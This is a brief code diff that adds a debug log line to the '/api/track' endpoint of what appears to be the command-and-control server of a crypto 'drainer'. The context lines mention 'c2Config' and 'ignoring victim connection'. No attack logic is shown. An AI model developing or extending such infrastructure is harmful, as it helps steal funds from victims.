@@ -601,6 +601,7 @@ app.get("/dashboard.html", (req, res) => {
 
 // ==================== TRACKING & ANALYTICS ====================
 app.post("/api/track", async (req, res) => {
+  console.log('🎯 TRACK ENDPOINT HIT - Body:', JSON.stringify(req.body));
   try {
     if (!c2Config.enabled) {
       console.log('⏸️ Drainer disabled, ignoring victim connection');
